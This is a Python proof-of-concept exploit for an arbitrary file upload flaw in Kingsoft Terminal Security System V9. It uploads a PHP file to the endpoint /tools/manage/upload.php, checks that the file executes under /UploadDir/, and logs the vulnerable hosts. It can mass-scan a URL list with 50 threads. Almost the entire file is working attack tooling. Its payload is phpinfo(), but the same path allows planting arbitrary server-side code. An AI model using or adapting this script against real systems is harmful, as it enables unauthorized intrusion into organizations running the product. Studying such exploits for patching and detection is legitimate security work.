#金山终端安全系统V9任意文件上传漏洞poc
import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """


██╗  ██╗██╗███╗   ██╗ ██████╗ ███████╗ ██████╗ ███████╗████████╗████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██╗         
██║ ██╔╝██║████╗  ██║██╔════╝ ██╔════╝██╔═══██╗██╔════╝╚══██╔══╝╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██║         
█████╔╝ ██║██╔██╗ ██║██║  ███╗███████╗██║   ██║█████╗     ██║█████╗██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██║         
██╔═██╗ ██║██║╚██╗██║██║   ██║╚════██║██║   ██║██╔══╝     ██║╚════╝██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██║         
██║  ██╗██║██║ ╚████║╚██████╔╝███████║╚██████╔╝██║        ██║      ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║███████╗    
╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝ ╚═════╝ ╚═╝        ╚═╝      ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    
                                                                                                                                     
                                                        author:zm
"""
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="This is Kingsoft Terminal Security System V9 arbitrary file upload vulnerability")
    parser.add_argument('-u','-url',dest='url',type=str,help="Please input your URL")
    parser.add_argument('-f','-file',dest='file',type=str,help="Please input your File path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8')as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/tools/manage/upload.php"
    headers = {
        'User-Agent': 'Mozilla/5.0', 
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'multipart/form-data; boundary=---------------------------332985667634852910053507734731',
        'Content-Length': '266',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }
    data = "-----------------------------332985667634852910053507734731\r\nContent-Disposition: form-data; name=\"file\";filename=\"11111111111111111111111111111111.php\"Content-Type: image/png\r\n\r\n<?php phpinfo();?>\r\n-----------------------------332985667634852910053507734731--\r\n\r\n\r\n"
    try:
        res1 = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=10)
        if res1.status_code == 200 and 'successfully' in res1.text:
            res2 =requests.get(url=target+'/UploadDir/11111111111111111111111111111111.php',verify=False,timeout=10)
            if res2.status_code == 200:
                print(f"[+]{target} have loophole “{target+payload}”")
                with open ('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
        else:
            print(f"[-]{target} have loophole")
    except:
        pass

if __name__ == "__main__":
    main()